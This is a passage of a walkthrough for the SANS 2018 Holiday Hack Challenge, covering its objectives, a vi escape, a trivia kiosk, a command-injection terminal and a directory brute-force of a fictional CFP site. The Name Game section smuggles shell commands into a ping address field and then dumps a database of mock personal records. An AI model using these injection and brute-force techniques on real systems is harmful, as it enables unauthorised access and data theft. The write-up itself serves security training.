---
layout: single
title: "SANS 2018 Holiday Hack Challenge"
header:
  overlay_image: hh18-header.png
  caption: "[SANS Holiday Hack Challenge](https://holidayhackchallenge.com/2018/)"
related: true
comments: true
---

Happy Holidays and a Happy New Year 2019 readers! 

{% include toc title="Solutions Index" icon="file-text" %}

Thanks for joining me today as we go over the [SANS 2018 Holiday Hack Challenge](https://www.holidayhackchallenge.com/2018/)!

As always, SANS has done an amazing job at making this as fun as possible, while also being very educational!

I also want to give a quick shout out to the amazing Community from the CentralSec Slack Channel and from SANS for always helping everyone out and continuously teaching the community. This is what makes the InfoSec community amazing! 

Just a quick heads up - this is a very comprehensive and long post. I will include an Index for you to be able to jump to a certain portion of the challenge; if you are only looking for solutions.

For others, the challenges are still available to play through - and will be till next year! So if you want to follow along, or give it a go by yourself, then you can start [here](https://www.holidayhackchallenge.com/2018/)!

## Introduction

This year the whole SANS Holiday Hack takes place at [KringleCon](https://www.kringlecon.com/)! Upon creating an account, logging in, you are dropped in front of the KringleCon gate entrance. 

From here, as well as from the Holiday Hack website, we get to follow the story and access our challenges.

<p align="center"><a href="/images/hh18-1.png"><img src="/images/hh18-1.png"></a></p>

> As you walk through the gates, a familiar red-suited holiday figure warmly welcomes all of his special visitors to KringleCon.

<p align="center"><a href="/images/hh18-2.png"><img src="/images/hh18-2.png"></a></p>

>  Welcome, my friends! Welcome to my castle! Would you come forward please?
>  
>  Welcome. It’s nice to have you here! I’m so glad you could come. This is going to be such an exciting day!
>  I hope you enjoy it. I think you will.
>  
>  Today is the start of KringleCon, our new conference for cyber security practitioners and hackers around the world.
>  
>  KringleCon is designed to share tips and tricks to help leverage our skills to make the world a better, safer place.
>  
>  Remember to look around, enjoy some talks by world-class speakers, and mingle with our other guests.
>  
>  And, if you are interested in the background of this con, please check out Ed Skoudis’ talk called [START HERE](https://youtu.be/31JsKzsbFUo).
>  
>  Delighted to meet you. Overjoyed! Enraptured! Entranced! Are we ready? Yes!  In we go!

Once we speak to Santa, we can then enter KringleCon and continue on with our challenges (objectives)!

You can access the objectives, hints, talks, and achievements by clicking on the Christmas tree shaped badge on your character. 

<p align="center"><a href="/images/hh18-3.png"><img src="/images/hh18-3.png"></a></p>

<p align="center"><a href="/images/hh18-3-1.png"><img src="/images/hh18-3-1.png"></a></p>

### Objectives

Once we access our Objectives we see that we have ten (10) questions that we need to answers. Hints to these objectives can be obtained by successful completing the associated Cranberry PI challenge, like every year so far!

The objectives, or questions that needed to be answers this year as as follows:

1. __Orientation Challenge__:
	* What phrase is revealed when you answer all of the questions at the KringleCon Holiday Hack History kiosk inside the castle? _For hints on achieving this objective, please visit Bushy Evergreen and help him with the  **Essential Editor Skills**  Cranberry Pi terminal challenge_.

2. __Directory Browsing__:
	* Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? [Please analyze the CFP site to find out](https://cfp.kringlecastle.com/). _For hints on achieving this objective, please visit Minty Candycane and help her with the  **The Name Game**  Cranberry Pi terminal challenge._

3. __de Bruijn Sequences__:
	* When you break into the speaker unpreparedness room, what does Morcel Nougat say?  _For hints on achieving this objective, please visit Tangle Coalbox and help him with  **Lethal ForensicELFication**  Cranberry Pi terminal challenge_.

4. __Data Repo Analysis__:
	* Retrieve the encrypted ZIP file from the [North Pole Git repository](https://git.kringlecastle.com/Upatree/santas_castle_automation). What is the password to open this file? _For hints on achieving this objective, please visit Wunorse Openslae and help him with  **Stall Mucking Report**  Cranberry Pi terminal challenge_.

5. __AD Privilege Discovery__:
	* Using the data set contained in this [SANS Slingshot Linux image](https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova), find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. _For hints on achieving this objective, please visit Holly Evergreen and help her with the  **CURLing Master**  Cranberry Pi terminal challenge_.

6. __Badge Manipulation__:
	* Bypass the authentication mechanism associated with the room near Pepper Minstix. [A sample employee badge is available](https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg). What is the access control number revealed by the door authentication panel? _For hints on achieving this objective, please visit Pepper Minstix and help her with the  **Yule Log Analysis**  Cranberry Pi terminal challenge_.

7. __HR Incident Response__:
	* Santa uses an Elf Resources website to look for talented information security professionals. [Gain access to the website](https://careers.kringlecastle.com/) and fetch the document `C:\candidate_evaluation.docx`. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." _For hints on achieving this objective, please visit Sparkle Redberry and help her with the  **Dev Ops Fail**  Cranberry Pi terminal challenge_.

8. __Network Traffic Forensics__:
	* Santa has introduced a web-based packet capture and analysis tool at [https://packalyzer.kringlecastle.com](https://packalyzer.kringlecastle.com/) to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? _For hints on achieving this objective, please visit SugarPlum Mary and help her with the  **Python Escape from LA** Cranberry Pi terminal challenge_.

9. __Ransomware Recovery__:
	* Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. _For hints on achieving this objective, please visit Shinny Upatree and help him with the  **Sleigh Bell Lottery**  Cranberry Pi terminal challenge_.
	
		* Task 1 - Assist Alabaster by building a Snort filter to identify the malware plaguing Santa's Castle.
		* Task 2- Using the Word  `docm`  file, identify the domain name that the malware communicates with.
		* Task 3 - Identify a way to stop the malware in its tracks!
		* Task 4 - Recover Alabaster's password as found in the the encrypted password vault.

10. __Who Is Behind It All?__:
	* Who was the mastermind behind the whole KringleCon plan? And, in your [emailed answers](mailto:SANSHolidayHackChallenge@counterhack.com) please explain that plan.

All right, now that we know all that - let's get into answering the questions!

## Objective 1

### Essential Editor Skills - CranPi

Upon entering the castle for KringleCon, we come up to Bushy Evergreen and her CranPi challenge. 

<p align="center"><a href="/images/hh18-4.png"><img src="/images/hh18-4.png"></a></p>

We can talk to Bushy to get an idea of what we need to complete the challenge, and we will also get a hint that can be accessed from the Hints tab on our badge.

<p align="center"><a href="/images/hh18-5.png"><img src="/images/hh18-5.png"></a></p>

Upon accessing the terminal, we are presented with the following output:

```console
                  ........................................
               .;oooooooooooool;,,,,,,,,:loooooooooooooll:
             .:oooooooooooooc;,,,,,,,,:ooooooooooooollooo:
           .';;;;;;;;;;;;;;,''''''''';;;;;;;;;;;;;,;ooooo:
         .''''''''''''''''''''''''''''''''''''''''';ooooo:
       ;oooooooooooool;''''''',:loooooooooooolc;',,;ooooo:
    .:oooooooooooooc;',,,,,,,:ooooooooooooolccoc,,,;ooooo:
  .cooooooooooooo:,''''''',:ooooooooooooolcloooc,,,;ooooo,
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;ooo,
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;l'
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,..
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc.
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooo:.
  coooooooooooooo,,,,,,,,,;ooooooooooooooloo;
  :llllllllllllll,'''''''';llllllllllllllc,



I'm in quite a fix, I need a quick escape.
Pepper is quite pleased, while I watch here, agape.
Her editor's confusing, though "best" she says - she yells!
My lesson one and your role is exit back to shellz.

-Bushy Evergreen

Exit vi.
```

So it seems what we have here, is a classic case of the vi's! What a pain! We can simply exit vi by doing the following.

`Press [ESC], then enter the colon [:], add an excmalation mark [!] and then press [ENTER]`

So the command should look like so `:q!`.

Once you press `[ENTER]` after typing the command, we see that we exit vi and complete the challenge.

```console
Loading, please wait......

You did it! Congratulations!

elf@09c19fa84179:~$
```

### Orientation Challenge

Upon successfully completing the Essential Editor CranPI, we can talk to Bushy again for more hints that will allow us to complete the first objective.

<p align="center"><a href="/images/hh18-6.png"><img src="/images/hh18-6.png"></a></p>

From here, we can go up and access the __Kringle History Kiosk__.

<p align="center"><a href="/images/hh18-7.png"><img src="/images/hh18-7.png"></a></p>

Upon clicking the Kiosk we are presented with the following:

<p align="center"><a href="/images/hh18-8.png"><img src="/images/hh18-8.png"></a></p>

So it seems we have to answer questions about the previous Holiday Hack challenges. These are pretty simple to answers by just googling write ups and utilizing your hint.

```
Answer all questions correctly to get the secret phrase!

Question 1: 
In 2015, the Dosis siblings asked for help understanding what piece of their "Gnome in Your Home" toy?

Answer: Firmaware

Question 2: 
In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?

Answer: ATHNAS

Question 3:
In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?

Answer: Business Card

Question 4:
In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?

Answer: Cranberry Pi

Question 5:
In 2017, the North Pole was being bombarded by giant objects. What were they?

Answer: Snowballs

Question 6: 
In 2017, Sam the snowman needed help reassembling pages torn from what?

Answer: Great Book
```

Upon answering the questions successfully, we are presented with the following screen, and the answers to our first challenge.  

<p align="center"><a href="/images/hh18-9.png"><img src="/images/hh18-9.png"></a></p>

From here, we can navigate to the first objective in our badge and enter "__Happy Trails__" to complete the challenge.

<p align="center"><a href="/images/hh18-10.png"><img src="/images/hh18-10.png"></a></p>

## Objective 2

### The Name Game - CranPi

From Bushy, we walk to the left hand side of the castle, and in the bottom left corner we meet Misty Candycane! 

<p align="center"><a href="/images/hh18-11.png"><img src="/images/hh18-11.png"></a></p>

Talking to Misty we figure out what the challenge consists of, and of course we also get a couple of hints to help in completing the CranPi challenge.

<p align="center"><a href="/images/hh18-11-1.png"><img src="/images/hh18-11-1.png"></a></p>

Upon accessing the terminal we are presented with the following output:

```console
We just hired this new worker,  
Californian or New Yorker?  
Think he's making some new toy bag...  
My job is to make his name tag.

Golly gee, I'm glad that you came,  
I recall naught but his last name!  
Use our system or your own plan,  
Find the first name of our guy "Chan!"

-Bushy Evergreen

To solve this challenge, determine the new worker's first name and submit to runtoanswer.

====================================================================  
=  =  
= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =  
=  =  
====================================================================

Press  1 to start the onboard process.  
Press  2 to verify the system.  
Press  q to quit.

Please make a selection:
```

Alright, so to complete this challenge we need to determine the new worker's first name, who's called Chan by trying to get access to the database. 

From the start it seems that we're inside a program and have the ability to make two (2) selections.

When we select option 1, we get the following employee registration info.

```console
Welcome to Santa's Castle!

At Santa's Castle, our employees are our family. We care for each other,  
and support everyone in our common goals.

Your first test at Santa's Castle is to complete the new employee onboarding paperwork.  
Don't worry, it's an easy test! Just complete the required onboarding information below.

Enter your first name.  
:
```

This seems interesting at first as this might contain a [SQL Injection]() vulnerability if writing to a database, but when we select option 2, we get something of much more interest!

```console
Validating data store for employee onboard information.  
Enter address of server:
``` 

We see the text "`Enter address of server:`.... Hmm, I smell a [Command Injection]() vulnerability! Let's go ahead and enter `localhost` as the address to see what the application does.

```console
Validating data store for employee onboard information.  
Enter address of server: localhost  
PING localhost (127.0.0.1) 56(84) bytes of data.  
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.046 ms  
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.050 ms  
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.052 ms

--- localhost ping statistics ---  
3 packets transmitted, 3 received, 0% packet loss, time 2032ms  
rtt min/avg/max/mdev = 0.046/0.049/0.052/0.006 ms  
onboard.db: SQLite 3.x database  
Press Enter to continue...:
```

Interesting! So it seems that the application utilizes [ping](http://) to check if the data store (or database in this case) is live.

Looking back at the first hint we got from Minty, we see information about the `&` call operator.

<p align="center"><a href="/images/hh18-12.png"><img src="/images/hh18-12.png"></a></p>

For those unfamiliar with this, the `&` symbol is a __call__ [operator](https://ss64.com/ps/syntax-operators.html) that allows us to execute commands, scripts, and functions within PowerShell. It will allow for the execution of a single command and any arguments within the script.

Now let's just take a moment and look back at the ping command before we do anything. Do you see something odd from ping?

```
PING localhost (127.0.0.1) 56(84) bytes of data.  
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.046 ms
```

If the first thing you noticed is the [TTL](https://en.wikipedia.org/wiki/Time_to_live) then you are spot on! The TTL is __64__, which means that this is a Linux system and not windows! If it was a windows system then the TTL would be __128__.

This also means that [PowerShell Core](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux?view=powershell-6) must be installed on the system. The reason that this is important to us is because the call operator (`&`) will work differently on powershell in windows, and powershell core for linux during injection.

Let's take this challenge for example. If this script was used on windows powershell and we injected "`& whoami`" then we would get the following output with ping.

```powershell
PS C:\Users\User> ping -r 3 localhost & whoami
At line:1 char:21
+ ping -r 3 localhost & whoami
+                     ~
The ampersand (&) character is not allowed. The & operator is reserved for future use; wrap an ampersand in double
quotation marks ("&") to pass it as part of a string.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : AmpersandNotAllowed
``` 

So you see, it wouldn't work! But, because we are possibly using linux commands for this script as well, what would happen if we inject "`& whoami`" to ping?

```console
root@kali:~# pwsh
PowerShell v6.0.3  
Copyright (c) Microsoft Corporation. All rights reserved.

[https://aka.ms/pscore6-docs](https://aka.ms/pscore6-docs)  
Type 'help' to get help.

PS /root/> /bin/ping -c 3 & ls
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]  
[-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]  
[-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]  
[-w deadline] [-W timeout] [hop1 ...] destination
root
```

Do you see what happened? Because ping failed, powershell was not able to process the command, so it defaulted to the call operator and called the command! 

Now that we know that injection via `&` is successful in linux, let's see if we can't list the files on the system.

```console
Validating data store for employee onboard information.  
Enter address of server: & ls -la  
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]  
[-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]  
[-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]  
[-w deadline] [-W timeout] [hop1 ...] destination  
total 5476  
drwxr-xr-x 1 elf  elf  4096 Dec 24 18:22 .  
drwxr-xr-x 1 root root  4096 Dec 14 16:17 ..  
-rw-r--r-- 1 elf  elf  220 Aug 31  2015 .bash_logout  
-rw-r--r-- 1 root root  95 Dec 14 16:13 .bashrc  
drwxr-xr-x 3 elf  elf  4096 Dec 24 18:20 .cache  
drwxr-xr-x 3 elf  elf  4096 Dec 24 18:20 .local  
-rw-r--r-- 1 root root  3866 Dec 14 16:13 menu.ps1  
-rw-rw-rw- 1 root root  24576 Dec 24 18:22 onboard.db  
-rw-r--r-- 1 elf  elf  655 May 16  2017 .profile  
-rwxr-xr-x 1 root root 5547968 Dec 14 16:13 runtoanswer  
onboard.db: SQLite 3.x database  
Press Enter to continue...:
```

Yup we were right, it worked! And with that we can see that we can access the `menu.ps1` powershell script. So let's go ahead and print it out using the `& cat menu.ps1` command.

After injection of the command, we get the following script:

```powershell
$global:firstrun = $TRUE

function Show-Menu
{
    $intro = @(
        "We just hired this new worker,",
        "Californian or New Yorker?",
        "Think he's making some new toy bag...",
        "My job is to make his name tag.",
        "",
        "Golly gee, I'm glad that you came,",
        "I recall naught but his last name!",
        "Use our system or your own plan,",
        "Find the first name of our guy `"Chan!`"",
        "",
        "-Bushy Evergreen",
        "",
        "To solve this challenge, determine the new worker's first name and submit to runtoanswer."
    )
    $header = @(
        "===================================================================="
        "=                                                                  =",
        "= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =",
        "=                                                                  =",
        "===================================================================="
    )

    cls
    if ($global:firstrun -eq $TRUE) {
        Write-Host "`n`n"
        for ($i = 0; $i -lt $intro.length; $i++) {
            Write-Host $intro[$i]
        }
        $global:firstrun = $FALSE
    }

    Write-Host "`n`n`n"
    for ($i = 0; $i -lt $header.length; $i++) {
        Write-Host $header[$i]
    }
    Write-Host "`n`n`n"
    Write-Host ' Press '1' to start the onboard process.'
    Write-Host ' Press '2' to verify the system.'
    Write-Host ' Press 'q' to quit.'
    Write-Host "`n"
}

function Employee-Onboarding-Form
{
    Write-Host "`n`nWelcome to Santa's Castle!`n`n"
    Write-Host "At Santa's Castle, our employees are our family. We care for each other,"
    Write-Host "and support everyone in our common goals.`n"
    Write-Host "Your first test at Santa's Castle is to complete the new employee onboarding paperwork."
    Write-Host "Don't worry, it's an easy test! Just complete the required onboarding information below.`n`n"

    $efirst = Read-Host "Enter your first name.`n"
    $elast = Read-Host "Enter your last name.`n"
    $estreet1 = Read-Host "Enter your street address (line 1 of 2).`n"
    $estreet2 = Read-Host "Enter your street address (line 2 of 2).`n"
    $ecity = Read-Host "Enter your city.`n"
    $epostalcode = Read-Host "Enter your postal code.`n"
    $ephone = Read-Host "Enter your phone number.`n"
    $eemail = Read-Host "Enter your email address.`n"

    Write-Host "`n`nIs this correct?`n`n"
    Write-Host "$efirst $elast"
    Write-Host "$estreet1"
    if ($estreet2) {
        Write-Host "$estreet2"
    }
    Write-Host "$ecity, $epostalcode"
    Write-Host "$ephone"
    Write-Host "$eemail"

    $input = Read-Host 'y/n'
    if ($input -eq 'y' -Or $input -eq 'Y') {
        Write-Host "Save to sqlite DB using command line"
        Start-Process -FilePath "./sqlite3" -ArgumentList "onboard.db `"INSERT INTO onboard (fname, lname, street1, street2, city, postalcode, phone, email) VALUES (`'$efirst`',`'$elast`', `'$estreet1`', `'$estreet2`', `'$ecity`', `'$epostalcode`', `'$ephone`', `'$eemail`')`""
    }
}

try
{
    do
    {
        Show-Menu
        $input = Read-Host 'Please make a selection'
        switch ($input)
        {
            '1' {
                cls
                Employee-Onboarding-Form
            } '2' {
                cls
                Write-Host "Validating data store for employee onboard information."
                $server = Read-Host 'Enter address of server'
                /bin/bash -c "/bin/ping -c 3 $server"
                /bin/bash -c "/usr/bin/file onboard.db"
            } '9' {
                /usr/bin/pwsh
                return
            } 'q' {
                return
            } default {
                Write-Host "Invalid entry."
            }
        }
        pause
    }
    until ($input -eq 'q')
} finally {
}
```

Upon looking into the code, we can see the following hidden command!

```powershell
} '9' {
/usr/bin/pwsh
return
```

So, if we were to press `9` in the selection screen, we would launch a powershell shell, which should allow us to break out. Let's give it a try!

```console
Please make a selection: 9  
PowerShell v6.0.3  
Copyright (c) Microsoft Corporation. All rights reserved.

[https://aka.ms/pscore6-docs](https://aka.ms/pscore6-docs)  
Type 'help' to get help.

PS /home/elf>
```

And we broke out! From here, we now need to dump the `onboard.db` database! We can do this by simply using sqlite3, and the [.dump](https://linux.die.net/man/1/sqlite3) command.

```console
PS /home/elf>  sqlite3 onboard.db .dump  
PRAGMA foreign_keys=OFF;  
BEGIN TRANSACTION;  
CREATE TABLE onboard (  
id INTEGER PRIMARY KEY,  
fname TEXT NOT NULL,  
lname TEXT NOT NULL,  
street1 TEXT,  
street2 TEXT,  
city TEXT,  
postalcode TEXT,  
phone TEXT,  
email TEXT  
);  
INSERT INTO "onboard" VALUES(10,'Karen','Duck','52 Annfield Rd',NULL,'BEAL','DN14 7AU','077 8656 6609','karensduck@einrot.com');  
---snip--- 
INSERT INTO "onboard" VALUES(83,'Joseph','Johnson','3443 Delaware Avenue',NULL,'San Francisco','94108','415-274-4354','josephjjohnson@cuvox.de');  
INSERT INTO "onboard" VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');  
---snip---  
INSERT INTO "onboard" VALUES(169,'Stephanie','Jaynes','1854 Tycos Dr',NULL,'Toronto','M5T 1T4','416-605-0198','stephaniejjaynes@rhyta.com');  
COMMIT;
```

Awesome, we found our guy, and his name is Scott!

```
INSERT INTO "onboard" VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');  
```

Now that we know Mr. Chan's name, let's run the `./runtoanswer` command and complete the CranPi challenge.

```console
PS /home/elf> ./runtoanswer                                                                       
Loading, please wait......



Enter Mr. Chan's first name: Scott


                                                                                
    .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:'    
  'ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO000Okdooooooooooooo;  
 'oooooooooooooXMWooooOMMxodMMNKKKKxoOMMxoooooWMXoooookNMWK0KNMWOooooooooooooo; 
 :oooooooooooooXMWooooOMMxodMM0ooooooOMMxoooooWMXooooxMMKoooooKMMkooooooooooooo 
 coooooooooooooXMMMMMMMMMxodMMWWWW0ooOMMxoooooWMXooooOMMkoooookMM0ooooooooooooo 
 coooooooooooooXMWdddd0MMxodMM0ddddooOMMxoooooWMXooooOMMOoooooOMMkooooooooooooo 
 coooooooooooooXMWooooOMMxodMMKxxxxdoOMMOkkkxoWMXkkkkdXMW0xxk0MMKoooooooooooooo 
 cooooooooooooo0NXooookNNdodXNNNNNNkokNNNNNNOoKNNNNNXookKNNWNXKxooooooooooooooo 
 cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo 
 cooooooooooooooooooooooooooooooooooMYcNAMEcISooooooooooooooooooooooooooooooooo
 cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo 
 OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW 
 OMMMMMMMMMMMMW:  .. ;MMMk'     .NMX:.  .  .lWO         d         xMMMMMMMMMMMW 
 OMMMMMMMMMMMMo  OMMWXMMl  lNMMNxWK  ,XMMMO  .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMX.  .cOWMN  'MMMMMMM;  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMMMKo,   KN  ,MMMMMMM,  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMKNMMMO  oM,  dWMMWOWk  cWMMMO  ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMc ...  cWMWl.  .. .NMk.  ..  .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK 
 .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo, 
  .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,  
    .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;.    
                                                                                

Congratulations!
```

### Directory Browsing

Upon successfully completing The Name Game CranPI, we can talk to Minty again for more hints that will allow us to complete the second objective.

<p align="center"><a href="/images/hh18-13.png"><img src="/images/hh18-13.png"></a></p>

For this objective, we need to figure out the First and Last name of the person who submitted the rejected talk titled: "__Data Loss for Rainbow Teams: A Path in the Darkness?__".

To do this, we need to go and analyze the [ KringleCon CFP ](https://cfp.kringlecastle.com/) site to find out.

Upon accessing the site, we are presented with the following screen.

<p align="center"><a href="/images/hh18-14.png"><img src="/images/hh18-14.png"></a></p>

Since the challenge is literally called "__Directory Browsing__", I'm just going to assume that this means "forced" browsing, or in other words directory brute forcing.

We can do this easily by using [DirBuser](https://tools.kali.org/web-applications/dirbuster). I opted for using the `directory-list-lowercase-2.3-medium.txt` word list along with the `html` and `txt` extensions. 

<p align="center"><a href="/images/hh18-15.png"><img src="/images/hh18-15.png"></a></p>

Once configured, I kicked off the scan and got the following results.

<p align="center"><a href="/images/hh18-16.png"><img src="/images/hh18-16.png"></a></p>

We can see that there is an interesting directory called `/cfp/` so let's go ahead and browse to it.

Upon browsing to the directory, we are presented with the following files.

<p align="center"><a href="/images/hh18-17.png"><img src="/images/hh18-17.png"></a></p>

We see that we found the `rejected-talks.csv` which should give us an idea of who the person was! So let's open that file.

```
talkCandidateId,request,payload,status,error,timeout,firstName,lastName,title,talkName,approveVotes,rejectVotes  
qmt1,0,8040422,200,FALSE,FALSE,Banky,Orford,Marketing Coordinator,Kernel Introspection Spearphishing: Massively Multithreaded,4,8  
qmt2,1,8040423,200,FALSE,FALSE,Sarah,Thibodeaux,Event Planner,Crypto or Containers: Abused for Fun and Proft,4,8  
qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11  
---snip---
qmt252,251,8040673,200,FALSE,FALSE,Godart,Roskilly,Operations Specialist,Boot Sector Malware and Cookies: Hacks You,2,10  
qmt253,252,8040674,200,FALSE,FALSE,Jack,Fellibrand,Marketing Director,Hacktivism not Spearphishing: Eavesdropping and More,2,10  
qmt254,253,8040675,200,FALSE,FALSE,Ada,Merigot,Marketing Specialist,Web Application Content Filtering or Containers: Massively Multithreaded,5,7
```

From the CSV we can see the third submission is our target!

```
qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11 
```

From here, we can navigate to the second objective in our badge and enter the name "__John McClane__" to complete the challenge.

<p align="center"><a href="/images/hh18-18.png"><img src="/images/hh18-18.png"></a></p>

## Objective 3

### Lethal ForensicELFication - CranPi

From Misty, we got up the stairs, and to the right. Next to the Speaker UnPreparedness Room, we meet Tangle Coalbox!

<p align="center"><a href="/images/hh18-19.png"><img src="/images/hh18-19.png"></a></p>

Talking to Tangle we figure out what the challenge consists of, and of course we also get a couple of hints to help in completing the CranPi challenge.

<p align="center"><a href="/images/hh18-19-1.png"><img src="/images/hh18-19-1.png"></a></p>

Upon accessing the terminal we are presented with the following output:

```console
                       ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM
                       ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM
   .,.   ,. .......,.  .',..'',,..:::::,,;:c:::ccooooodxkkOOkOO0KKXXXNNWMMMMMMM
   ldd: .d' ';... .o:  .d;.;:....'dl,;do,:lloc:codddodOOxxk0KOOKKKKXNNNWMMMMMMM
   lo.ol.d' ';'..  ,d'.lc..;:,,,.'docod:,:l:locldlddokOxdxxOK0OKKKXXXNNWMMMMMMM
   lo  lod' ';      co:o...;:....'dl':dl,:l::oodlcddoxOkxxk0KOOKKKKXNNNWMMMMMMM
   ,,   ,;. ......  .;:....',,,,''c:'':l;;c:;:llccoooodkkOOOkOO0KKKXNNNWMMMMMMM
                       ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM
                       ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM

Christmas is coming, and so it would seem,
ER (Elf Resources) crushes elves' dreams.
One tells me she was disturbed by a bloke.
He tells me this must be some kind of joke.

Please do your best to determine what's real.
Has this jamoke, for this elf, got some feels?
Lethal forensics ain't my cup of tea;
If YOU can fake it, my hero you'll be.

One more quick note that might help you complete,
Clearing this mess up that's now at your feet.
Certain text editors can leave some clue.
Did our young Romeo leave one for you?

- Tangle Coalbox, ER Investigator

  Find the first name of the elf of whom a love poem 
  was written.  Complete this challenge by submitting 
  that name to runtoanswer.
elf@27c731a8b356:~$
```

So it seems for this challenge we need to do some forensic work to find the first name of the elf who a love poem was written for.

Alright, seems simple enough! Let's start off by seeing what we have to work with.

```console
elf@27c731a8b356:~$ ls -la
total 5460
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .
drwxr-xr-x 1 root root    4096 Dec 14 16:28 ..
-rw-r--r-- 1 elf  elf      419 Dec 14 16:13 .bash_history
-rw-r--r-- 1 elf  elf      220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf     3540 Dec 14 16:28 .bashrc
-rw-r--r-- 1 elf  elf      675 May 15  2017 .profile
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .secrets
-rw-r--r-- 1 elf  elf     5063 Dec 14 16:13 .viminfo
-rwxr-xr-x 1 elf  elf  5551072 Dec 14 16:13 runtoanswer
```

Interesting. It seems that we have a folder called `.secrets`. Let's access that and see what's inside.

```console
elf@27c731a8b356:~$ cd .secrets/
elf@27c731a8b356:~/.secrets$ ls -la
total 12
drwxr-xr-x 1 elf elf 4096 Dec 14 16:28 .
drwxr-xr-x 1 elf elf 4096 Dec 14 16:28 ..
drwxr-xr-x 1 elf elf 4096 Dec 14 16:28 her
elf@27c731a8b356:~/.secrets$ cd her
elf@27c731a8b356:~/.secrets/her$ ls -la
total 12
drwxr-xr-x 1 elf elf 4096 Dec 14 16:28 .
drwxr-xr-x 1 elf elf 4096 Dec 14 16:28 ..
-rw-r--r-- 1 elf elf 1880 Dec 14 16:13 poem.txt
```

Great, so it seems we found our poem! We can go ahead and read it to see if we can't find any clues.

```console
elf@27c731a8b356:~/.secrets/her$ cat poem.txt 
Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,
Shining many a beautiful sleighbell bearing cheer and sound so pure--
  There he cleaned them, nearly napping, suddenly there came a tapping,
As of someone gently rapping, rapping at the sleigh house door.
"'Tis some caroler," he muttered, "tapping at my sleigh house door--
  Only this and nothing more."

Then, continued with more vigor, came the sound he didn't figure,
Could belong to one so lovely, walking 'bout the North Pole grounds.
  But the truth is, she WAS knocking, 'cause with him she would be talking,
Off with fingers interlocking, strolling out with love newfound?
Gazing into eyes so deeply, caring not who sees their rounds.
  Oh, 'twould make his heart resound!

Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.
Floating over, more than walking, moving toward the sound still knocking,
  Pausing at the elf-length mirror, checked himself to study clearer,
Fixing hair and looking nearer, what a hunky elf - not shocking!
Peering through the peephole smiling, reaching forward and unlocking:
  NEVERMORE in tinsel stocking!

Greeting her with smile dashing, pearly-white incisors flashing,
Telling jokes to keep her laughing, soaring high upon the tidings,
